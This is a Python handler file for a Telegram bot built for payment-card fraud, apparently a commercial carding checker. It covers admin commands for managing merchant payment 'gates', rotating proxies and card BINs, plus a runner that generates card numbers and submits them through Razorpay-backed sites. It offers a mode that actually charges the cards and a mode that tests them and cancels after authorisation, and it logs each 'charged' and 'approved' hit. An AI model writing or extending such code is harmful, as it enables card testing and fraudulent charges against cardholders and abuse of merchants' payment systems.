"""
handlers/admin.py — All sudo/admin-only commands
Includes: sites, proxies, BINs, user management, keys, stats, /fuck, /autohit
"""
import asyncio
import random
import time
from datetime import datetime

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

from config import (
    ADMIN_USER_ID, BATCH_SIZE, BOT_CREATOR, BOT_NAME,
    FORCE_AMOUNT, RK_BANNED, RK_BINS, RK_PROXIES,
    RK_SITES, RK_STATS, RK_SUDO,
)
from core.card_utils import gen_cards, parse_cc, validate_bin
from core.proxy_utils import get_live_proxies, parse_proxy, pick_proxy, test_proxy_raw
from core.razorpay_engine import check_card
from core.redis_client import redis
from core.site_utils import _gen_ua, get_live_sites, load_site_data
from utils.auth import create_keys, give_plan, is_admin, is_banned, is_sudo
from utils.decorators import need_sudo
from utils.emojis import e, safe
from utils.helpers import log_hit
from utils.state import active_tests


# ─── Sites ────────────────────────────────────────────────────────────────────

@need_sudo
async def cmd_addsite(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        await u.message.reply_text(
            f"{e('error')} /addsite URL", parse_mode=ParseMode.HTML
        )
        return
    url = " ".join(ctx.args).strip()
    if not url.startswith(("http://", "https://")):
        await u.message.reply_text(
            f"{e('error')} Must start with https://", parse_mode=ParseMode.HTML
        )
        return
    existing = await redis.lrange(RK_SITES, 0, -1)
    if url in existing:
        await u.message.reply_text(
            f"{e('error')} Site already exists.", parse_mode=ParseMode.HTML
        )
        return
    msg  = await u.message.reply_text(
        f"{e('loading')} Testing gate...", parse_mode=ParseMode.HTML
    )
    UA   = _gen_ua()
    sd   = await load_site_data(url, UA, None, auto_remove=False)
    await redis.lpush(RK_SITES, url)
    total = await redis.llen(RK_SITES)
    icon  = e("check") if sd else e("error")
    await msg.edit_text(
        f"{icon} Site {'added & working' if sd else 'added (not responding yet)'}\n"
        f"{e('stats')} Total gates: <code>{total}</code>",
        parse_mode=ParseMode.HTML,
    )


@need_sudo
async def cmd_live(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    sites = await redis.lrange(RK_SITES, 0, -1)
    if not sites:
        await u.message.reply_text(f"{e('error')} No sites.", parse_mode=ParseMode.HTML)
        return
    lines = "\n".join(
        f"  {i+1}. <code>{safe(s)}</code>" for i, s in enumerate(sites)
    )
    await u.message.reply_text(
        f"{e('site')} <b>Sites ({len(sites)})</b>\n\n{lines}",
        parse_mode=ParseMode.HTML,
    )


@need_sudo
async def cmd_checksite(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    sites = await redis.lrange(RK_SITES, 0, -1)
    if not sites:
        await u.message.reply_text(f"{e('error')} No sites.", parse_mode=ParseMode.HTML)
        return
    proxies = await get_live_proxies(auto_remove=True)
    px      = pick_proxy(proxies)
    UA      = _gen_ua()
    msg     = await u.message.reply_text(
        f"{e('loading')} Testing {len(sites)} sites (auto-removing dead)...",
        parse_mode=ParseMode.HTML,
    )
    out = []; alive = dead = 0
    for site in sites:
        sd = await load_site_data(site, UA, px, auto_remove=True)
        if sd:
            alive += 1
            out.append(f"  {e('check')} <code>{safe(site[:55])}</code>")
        else:
            dead += 1
            out.append(f"  {e('cross')} <s>{safe(site[:55])}</s> (removed)")
    await msg.edit_text(
        f"{e('search')} <b>Site Check</b> — {alive} live, {dead} removed\n\n"
        + "\n".join(out),
        parse_mode=ParseMode.HTML,
    )


@need_sudo
async def cmd_rmsite(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    sites = await redis.lrange(RK_SITES, 0, -1)
    if not sites:
        await u.message.reply_text(f"{e('error')} No sites.", parse_mode=ParseMode.HTML)
        return
    if ctx.args:
        try:
            idx = int(ctx.args[0]) - 1
            if 0 <= idx < len(sites):
                await redis.lrem(RK_SITES, 0, sites[idx])
                await u.message.reply_text(
                    f"{e('check')} Removed site #{idx + 1}.", parse_mode=ParseMode.HTML
                )
            return
        except ValueError:
            pass
    kb = [[InlineKeyboardButton(f"🗑 #{i+1}", callback_data=f"rmsite_{i}")]
          for i in range(len(sites))]
    kb.append([InlineKeyboardButton(f"{e('cross')} Cancel", callback_data="cancel")])
    await u.message.reply_text(
        f"{e('gear')} Pick site to remove:",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(kb),
    )


# ─── Proxies ──────────────────────────────────────────────────────────────────

@need_sudo
async def cmd_addpxy(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        await u.message.reply_text(
            f"{e('proxy')} /addpxy proxy1 proxy2...\n"
            f"Formats: ip:port | ip:port:user:pass | user:pass@ip:port | scheme://...",
            parse_mode=ParseMode.HTML,
        )
        return
    existing = set(await redis.lrange(RK_PROXIES, 0, -1))
    added = bad = dupe = 0
    for raw in ctx.args:
        if not parse_proxy(raw):
            bad += 1
            continue
        if raw in existing:
            dupe += 1
            continue
        await redis.lpush(RK_PROXIES, raw)
        existing.add(raw)
        added += 1
    total = await redis.llen(RK_PROXIES)
    await u.message.reply_text(
        f"{e('check')} Added: <code>{added}</code> | "
        f"Bad: <code>{bad}</code> | Dupe: <code>{dupe}</code>\n"
        f"{e('proxy')} Total: <code>{total}</code>",
        parse_mode=ParseMode.HTML,
    )


@need_sudo
async def cmd_proxy(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    proxies = await redis.lrange(RK_PROXIES, 0, -1)
    if not proxies:
        await u.message.reply_text(f"{e('error')} No proxies.", parse_mode=ParseMode.HTML)
        return
    lines = "\n".join(
        f"  {i+1}. <code>{safe(p)}</code>" for i, p in enumerate(proxies)
    )
    await u.message.reply_text(
        f"{e('proxy')} <b>Proxies ({len(proxies)})</b>\n\n{lines}",
        parse_mode=ParseMode.HTML,
    )


@need_sudo
async def cmd_testpxy(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    proxies = await redis.lrange(RK_PROXIES, 0, -1)
    if not proxies:
        await u.message.reply_text(f"{e('error')} No proxies.", parse_mode=ParseMode.HTML)
        return
    msg = await u.message.reply_text(
        f"{e('loading')} Testing {len(proxies)} proxies (auto-removing dead)...",
        parse_mode=ParseMode.HTML,
    )
    good = bad = 0
    out  = []
    for raw in proxies:
        ok, lat = await test_proxy_raw(raw)
        if ok:
            good += 1
            out.append(f"  {e('check')} <code>{safe(raw[:40])}</code> · {lat:.0f}ms")
        else:
            bad += 1
            await redis.lrem(RK_PROXIES, 0, raw)
            out.append(f"  {e('cross')} <s>{safe(raw[:40])}</s> (removed)")
    await msg.edit_text(
        f"{e('proxy')} <b>Proxy Test</b> — {good} live, {bad} removed\n\n"
        + "\n".join(out),
        parse_mode=ParseMode.HTML,
    )


@need_sudo
async def cmd_rmpxy(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    proxies = await redis.lrange(RK_PROXIES, 0, -1)
    if not proxies:
        await u.message.reply_text(f"{e('error')} No proxies.", parse_mode=ParseMode.HTML)
        return
    if ctx.args:
        try:
            idx = int(ctx.args[0]) - 1
            if 0 <= idx < len(proxies):
                await redis.lrem(RK_PROXIES, 0, proxies[idx])
                await u.message.reply_text(
                    f"{e('check')} Proxy #{idx + 1} removed.", parse_mode=ParseMode.HTML
                )
            return
        except ValueError:
            pass
    kb = [[InlineKeyboardButton(f"🗑 #{i+1}", callback_data=f"rmpxy_{i}")]
          for i in range(len(proxies))]
    kb.append([InlineKeyboardButton(f"{e('cross')} Cancel", callback_data="cancel")])
    await u.message.reply_text(
        f"{e('gear')} Pick proxy to remove:",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(kb),
    )


@need_sudo
async def cmd_clrpxy(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    await redis.delete(RK_PROXIES)
    await u.message.reply_text(
        f"{e('check')} All proxies cleared.", parse_mode=ParseMode.HTML
    )


# ─── BINs ─────────────────────────────────────────────────────────────────────

@need_sudo
async def cmd_addbim(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        await u.message.reply_text(
            f"{e('bin')} /addbim BIN1 BIN2...\n"
            f"Ex: <code>/addbim 411111 5xxxxx|12|25|rnd</code>",
            parse_mode=ParseMode.HTML,
        )
        return
    existing = set(await redis.lrange(RK_BINS, 0, -1))
    added = bad = dupe = 0
    for bp in ctx.args:
        ok, _ = validate_bin(bp)
        if not ok:
            bad += 1
            continue
        if bp in existing:
            dupe += 1
            continue
        await redis.lpush(RK_BINS, bp)
        existing.add(bp)
        added += 1
    await u.message.reply_text(
        f"{e('check')} Added: <code>{added}</code> | "
        f"Bad: <code>{bad}</code> | Dupe: <code>{dupe}</code>",
        parse_mode=ParseMode.HTML,
    )


@need_sudo
async def cmd_chkbim(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    bins = await redis.lrange(RK_BINS, 0, -1)
    if not bins:
        await u.message.reply_text(f"{e('error')} No BINs.", parse_mode=ParseMode.HTML)
        return
    lines = "\n".join(
        f"  {i+1}. <code>{safe(b)}</code>" for i, b in enumerate(bins)
    )
    await u.message.reply_text(
        f"{e('bin')} <b>BINs ({len(bins)})</b>\n\n{lines}",
        parse_mode=ParseMode.HTML,
    )


@need_sudo
async def cmd_rmbin(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    bins = await redis.lrange(RK_BINS, 0, -1)
    if not bins:
        await u.message.reply_text(f"{e('error')} No BINs.", parse_mode=ParseMode.HTML)
        return
    if ctx.args:
        try:
            idx = int(ctx.args[0]) - 1
            if 0 <= idx < len(bins):
                await redis.lrem(RK_BINS, 0, bins[idx])
                await u.message.reply_text(
                    f"{e('check')} BIN #{idx + 1} removed.", parse_mode=ParseMode.HTML
                )
            return
        except ValueError:
            pass
    kb = [[InlineKeyboardButton(f"🗑 {b}", callback_data=f"rmbin_{i}")]
          for i, b in enumerate(bins)]
    kb.append([InlineKeyboardButton(f"{e('cross')} Cancel", callback_data="cancel")])
    await u.message.reply_text(
        f"{e('gear')} Pick BIN to remove:",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(kb),
    )


# ─── Stats ────────────────────────────────────────────────────────────────────

@need_sudo
async def cmd_stats(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    sites    = await redis.llen(RK_SITES)
    proxies  = await redis.llen(RK_PROXIES)
    bins     = await redis.llen(RK_BINS)
    sudos    = len(await redis.smembers(RK_SUDO))
    banned   = len(await redis.smembers(RK_BANNED))
    gen      = await redis.hget(RK_STATS, "total_generated") or "0"
    hits     = await redis.hget(RK_STATS, "total_hits")      or "0"
    charged  = await redis.hget(RK_STATS, "total_charged")   or "0"
    approved = await redis.hget(RK_STATS, "total_approved")  or "0"
    await u.message.reply_text(
        f"{e('stats')} <b>Bot Stats</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{e('site')}   Gates:     <code>{sites}</code>\n"
        f"{e('proxy')}  Proxies:   <code>{proxies}</code>\n"
        f"{e('bin')}    BINs:      <code>{bins}</code>\n"
        f"{e('crown')}  Sudos:     <code>{sudos}</code>\n"
        f"{e('ban')}    Banned:    <code>{banned}</code>\n\n"
        f"{e('card')}   Generated: <code>{gen}</code>\n"
        f"{e('charged')} Charged:  <code>{charged}</code>\n"
        f"{e('approved')} Approved: <code>{approved}</code>\n"
        f"{e('stats')}  Total Hits: <code>{hits}</code>\n\n"
        f"{e('fire')}   v7.0 · {BOT_CREATOR}",
        parse_mode=ParseMode.HTML,
    )


# ─── User management ──────────────────────────────────────────────────────────

@need_sudo
async def cmd_sudo_add(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(u.effective_user.id):
        await u.message.reply_text(f"{e('ban')} Owner only.", parse_mode=ParseMode.HTML)
        return
    if not ctx.args:
        await u.message.reply_text(f"{e('error')} /sudo ID", parse_mode=ParseMode.HTML)
        return
    try:
        t = int(ctx.args[0])
        await redis.sadd(RK_SUDO, str(t))
        await u.message.reply_text(
            f"{e('check')} <code>{t}</code> is now sudo.", parse_mode=ParseMode.HTML
        )
    except ValueError:
        await u.message.reply_text(f"{e('error')} Invalid ID.", parse_mode=ParseMode.HTML)


@need_sudo
async def cmd_unsudo(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(u.effective_user.id):
        await u.message.reply_text(f"{e('ban')} Owner only.", parse_mode=ParseMode.HTML)
        return
    if not ctx.args:
        await u.message.reply_text(f"{e('error')} /unsudo ID", parse_mode=ParseMode.HTML)
        return
    try:
        t = int(ctx.args[0])
        await redis.srem(RK_SUDO, str(t))
        await u.message.reply_text(
            f"{e('check')} Sudo revoked from <code>{t}</code>.",
            parse_mode=ParseMode.HTML,
        )
    except ValueError:
        await u.message.reply_text(f"{e('error')} Invalid ID.", parse_mode=ParseMode.HTML)


@need_sudo
async def cmd_sudolist(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(u.effective_user.id):
        await u.message.reply_text(f"{e('ban')} Owner only.", parse_mode=ParseMode.HTML)
        return
    ms = await redis.smembers(RK_SUDO)
    if not ms:
        await u.message.reply_text(f"{e('info')} No sudo users.", parse_mode=ParseMode.HTML)
        return
    lines = "\n".join(f"  {e('star')} <code>{m}</code>" for m in sorted(ms))
    await u.message.reply_text(
        f"{e('crown')} <b>Sudo Users</b>\n\n{lines}", parse_mode=ParseMode.HTML
    )


@need_sudo
async def cmd_ban(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        await u.message.reply_text(f"{e('error')} /ban ID", parse_mode=ParseMode.HTML)
        return
    try:
        t = int(ctx.args[0])
        if t == ADMIN_USER_ID:
            await u.message.reply_text(
                f"{e('error')} Can't ban owner.", parse_mode=ParseMode.HTML
            )
            return
        await redis.sadd(RK_BANNED, str(t))
        await u.message.reply_text(
            f"{e('ban')} <code>{t}</code> banned.", parse_mode=ParseMode.HTML
        )
    except ValueError:
        await u.message.reply_text(f"{e('error')} Invalid ID.", parse_mode=ParseMode.HTML)


@need_sudo
async def cmd_unban(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        await u.message.reply_text(f"{e('error')} /unban ID", parse_mode=ParseMode.HTML)
        return
    try:
        t = int(ctx.args[0])
        await redis.srem(RK_BANNED, str(t))
        await u.message.reply_text(
            f"{e('check')} <code>{t}</code> unbanned.", parse_mode=ParseMode.HTML
        )
    except ValueError:
        await u.message.reply_text(f"{e('error')} Invalid ID.", parse_mode=ParseMode.HTML)


@need_sudo
async def cmd_banlist(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    banned = await redis.smembers(RK_BANNED)
    if not banned:
        await u.message.reply_text(
            f"{e('check')} No banned users.", parse_mode=ParseMode.HTML
        )
        return
    lines = "\n".join(f"  {e('ban')} <code>{m}</code>" for m in sorted(banned))
    await u.message.reply_text(
        f"{e('skull')} <b>Banned ({len(banned)})</b>\n\n{lines}",
        parse_mode=ParseMode.HTML,
    )


@need_sudo
async def cmd_addplan(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args or len(ctx.args) < 2:
        await u.message.reply_text(
            f"{e('error')} /addplan ID days [name]", parse_mode=ParseMode.HTML
        )
        return
    try:
        t    = int(ctx.args[0])
        days = int(ctx.args[1])
        name = " ".join(ctx.args[2:]) if len(ctx.args) > 2 else "Premium"
        exp  = await give_plan(t, days, name, u.effective_user.id)
        await u.message.reply_text(
            f"{e('check')} Plan assigned!\n"
            f"  {e('user')} User: <code>{t}</code>\n"
            f"  {e('plan')} Plan: <b>{safe(name)}</b>\n"
            f"  {e('clock')} Expires: <code>{exp}</code>",
            parse_mode=ParseMode.HTML,
        )
    except ValueError:
        await u.message.reply_text(f"{e('error')} Invalid values.", parse_mode=ParseMode.HTML)


async def cmd_genkey(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = u.effective_user.id
    if await is_banned(uid):
        return
    if not is_admin(uid) and not await is_sudo(uid):
        await u.message.reply_text(f"{e('lock')} Admin/Sudo only.", parse_mode=ParseMode.HTML)
        return
    if not ctx.args:
        await u.message.reply_text(
            f"{e('key')} /genkey days [count]\n  ex: <code>/genkey 30 5</code>",
            parse_mode=ParseMode.HTML,
        )
        return
    try:
        days  = int(ctx.args[0])
        count = max(1, min(int(ctx.args[1]) if len(ctx.args) > 1 else 1, 20))
        if days <= 0:
            await u.message.reply_text(
                f"{e('error')} Days must be > 0.", parse_mode=ParseMode.HTML
            )
            return
        msg  = await u.message.reply_text(
            f"{e('loading')} Generating...", parse_mode=ParseMode.HTML
        )
        keys = await create_keys(days, count, uid)
        lines = "\n".join(f"  {e('key')} <code>{k}</code>" for k in keys)
        await msg.edit_text(
            f"{e('check')} <b>{count} Key(s) — {days} days each</b>\n\n{lines}",
            parse_mode=ParseMode.HTML,
        )
    except ValueError:
        await u.message.reply_text(f"{e('error')} Invalid.", parse_mode=ParseMode.HTML)


# ─── /bhosade — Hidden admin menu ─────────────────────────────────────────────

async def cmd_bhosade(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = u.effective_user.id
    if await is_banned(uid):
        return
    if not await is_sudo(uid):
        return  # silent ignore for normal users
    own = is_admin(uid)
    oc  = (
        f"\n{e('crown')} <b>Owner Commands</b>\n  /sudo /unsudo /sudolist\n"
        if own else ""
    )
    await u.message.reply_text(
        f"{e('fire')} <b>Full Command Menu</b> {e('lock')} <i>sudo only</i>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{oc}"
        f"\n{e('user')} <b>Users</b>\n  /ban /unban /banlist /addplan /genkey\n"
        f"\n{e('site')} <b>Gates</b>\n  /addsite /live /checksite /rmsite\n"
        f"\n{e('proxy')} <b>Proxies</b>\n  /addpxy /proxy /testpxy /rmpxy /clrpxy\n"
        f"\n{e('bin')} <b>BINs</b>\n  /addbim /chkbim /rmbin /bin\n"
        f"\n{e('fire')} <b>Payment</b>\n  /fuck (real) · /autohit (cancel) · /stoptest\n"
        f"\n{e('card')} <b>Cards</b>\n  /gen /split /stats\n"
        f"\n{e('star')} <b>Public</b>\n  /rz /mrz /mrzstop /plans /redeem /profile /start /help",
        parse_mode=ParseMode.HTML,
    )


# ─── /fuck and /autohit ───────────────────────────────────────────────────────

@need_sudo
async def cmd_fuck(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    sites     = await redis.lrange(RK_SITES, 0, -1)
    bins      = await redis.lrange(RK_BINS, 0, -1)
    if not sites:
        await u.message.reply_text(f"{e('error')} No sites.", parse_mode=ParseMode.HTML)
        return
    if not bins:
        await u.message.reply_text(f"{e('error')} No BINs.", parse_mode=ParseMode.HTML)
        return
    proxies_ct = await redis.llen(RK_PROXIES)
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🟩 ₹1",   callback_data="fuck_100"),
         InlineKeyboardButton("🟦 ₹10",  callback_data="fuck_1000")],
        [InlineKeyboardButton("🟧 ₹50",  callback_data="fuck_5000"),
         InlineKeyboardButton("🟥 ₹100", callback_data="fuck_10000")],
        [InlineKeyboardButton(f"{e('cross')} Cancel", callback_data="cancel")],
    ])
    await u.message.reply_text(
        f"{e('fire')} <b>Real Charge Test</b>\n\n"
        f"  {e('site')}  Gates:   <code>{len(sites)}</code>\n"
        f"  {e('bin')}   BINs:    <code>{len(bins)}</code>\n"
        f"  {e('proxy')} Proxies: <code>{proxies_ct}</code>\n\n"
        f"{e('warning')} <i>Cards will be ACTUALLY charged!</i>\n"
        f"Select amount:",
        parse_mode=ParseMode.HTML,
        reply_markup=kb,
    )


@need_sudo
async def cmd_autohit(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    sites     = await redis.lrange(RK_SITES, 0, -1)
    bins      = await redis.lrange(RK_BINS, 0, -1)
    if not sites:
        await u.message.reply_text(f"{e('error')} No sites.", parse_mode=ParseMode.HTML)
        return
    if not bins:
        await u.message.reply_text(f"{e('error')} No BINs.", parse_mode=ParseMode.HTML)
        return
    proxies_ct = await redis.llen(RK_PROXIES)
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🟩 ₹1",   callback_data="auto_100"),
         InlineKeyboardButton("🟦 ₹10",  callback_data="auto_1000")],
        [InlineKeyboardButton("🟧 ₹50",  callback_data="auto_5000"),
         InlineKeyboardButton("🟥 ₹100", callback_data="auto_10000")],
        [InlineKeyboardButton(f"{e('cross')} Cancel", callback_data="cancel")],
    ])
    await u.message.reply_text(
        f"{e('bolt')} <b>Auto-Hit Checker</b>\n\n"
        f"  {e('site')}  Gates:   <code>{len(sites)}</code>\n"
        f"  {e('bin')}   BINs:    <code>{len(bins)}</code>\n"
        f"  {e('proxy')} Proxies: <code>{proxies_ct}</code>\n\n"
        f"{e('info')} Auto-cancel after auth — no real charge",
        parse_mode=ParseMode.HTML,
        reply_markup=kb,
    )


@need_sudo
async def cmd_stop_test(u: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    cid = u.effective_chat.id
    if active_tests.get(cid):
        active_tests[cid] = False
        await u.message.reply_text(f"{e('stop')} Stopping...", parse_mode=ParseMode.HTML)
    else:
        await u.message.reply_text(f"{e('info')} No active test.", parse_mode=ParseMode.HTML)


# ─── Autohit runner (shared by /fuck and /autohit callbacks) ──────────────────

async def run_autohit(
    chat_id: int,
    amount: int,
    ctx: ContextTypes.DEFAULT_TYPE,
    cancel_mode: bool,
    tg_user,
) -> None:
    sites   = await redis.lrange(RK_SITES, 0, -1)
    bins    = await redis.lrange(RK_BINS, 0, -1)
    if not sites or not bins:
        await ctx.bot.send_message(
            chat_id, f"{e('error')} Missing sites/BINs.", parse_mode=ParseMode.HTML
        )
        return

    proxies    = await get_live_proxies(auto_remove=True)
    cards      = list(gen_cards(random.choice(bins) if bins else "411111", BATCH_SIZE * 8))
    if not cards:
        await ctx.bot.send_message(
            chat_id, f"{e('error')} Card gen failed.", parse_mode=ParseMode.HTML
        )
        return

    amt_inr   = amount // 100
    mode_str  = "Real Charge" if not cancel_mode else "Auto-Hit"
    sm = await ctx.bot.send_message(
        chat_id,
        f"{e('fire')} <b>{mode_str} Started</b>\n"
        f"  {e('coin')} Amount: ₹{amt_inr}\n"
        f"  {e('card')} Cards: {len(cards)}\n"
        f"  {e('lock')} Gates: hidden",
        parse_mode=ParseMode.HTML,
    )
    active_tests[chat_id] = True
    live_sites = await get_live_sites(proxies)

    if not live_sites:
        await sm.edit_text(f"{e('error')} No live gates!", parse_mode=ParseMode.HTML)
        active_tests.pop(chat_id, None)
        return

    ok_ct = ch_ct = fail_ct = 0
    for card_str in cards:
        if not active_tests.get(chat_id):
            break
        p = parse_cc(card_str)
        if not p:
            continue
        cc_n, mm_n, yy_n, cvv_n = p
        site = random.choice(live_sites)
        px   = pick_proxy(proxies)
        res  = await check_card(cc_n, mm_n, yy_n, cvv_n, site, px, amount)
        st   = res.get("status", "error")
        msg_r = res.get("message", "")

        if st == "charged":
            ch_ct += 1
            await ctx.bot.send_message(
                chat_id,
                f"{e('charged')} <b>CHARGED</b> · ₹{amt_inr}\n"
                f"  {e('bolt')} {safe(msg_r[:70])}",
                parse_mode=ParseMode.HTML,
            )
            if tg_user:
                await log_hit(ctx.bot, "CHARGED", card_str, amt_inr, tg_user, msg_r)
        elif st == "approved":
            ok_ct += 1
            if tg_user:
                await log_hit(ctx.bot, "APPROVED", card_str, amt_inr, tg_user, msg_r)
        else:
            fail_ct += 1

        await redis.hincrby(RK_STATS, "total_hits", 1)
        await asyncio.sleep(0.3)

    active_tests.pop(chat_id, None)
    await sm.edit_text(
        f"{e('check')} <b>{mode_str} Complete</b>\n\n"
        f"  {e('charged')} Charged: <code>{ch_ct}</code>\n"
        f"  {e('approved')} Live:   <code>{ok_ct}</code>\n"
        f"  {e('dead')} Dead:    <code>{fail_ct}</code>",
        parse_mode=ParseMode.HTML,
    )
